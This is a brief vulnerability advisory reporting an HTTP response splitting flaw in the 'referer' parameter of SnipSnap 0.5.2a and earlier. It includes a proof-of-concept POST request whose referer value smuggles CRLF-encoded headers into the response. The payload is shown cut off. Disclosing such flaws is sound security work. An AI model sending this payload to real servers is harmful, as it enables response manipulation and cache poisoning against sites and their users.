SnipSnap is reported prone to an HTTP response splitting vulnerability. The issue exists in the 'referer' parameter. The issue presents itself due to a flaw in the application that allows an attacker to manipulate how POST requests are handled.

This issue was identified in SnipSnap 0.5.2a and prior.

The following proof of concept example is available:
POST /exec/authenticate HTTP/1.0
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 197

referer=abc%0d%0aConnection:%20keep-alive%0d%0aContent-Length:%200%0d%0a%0d%
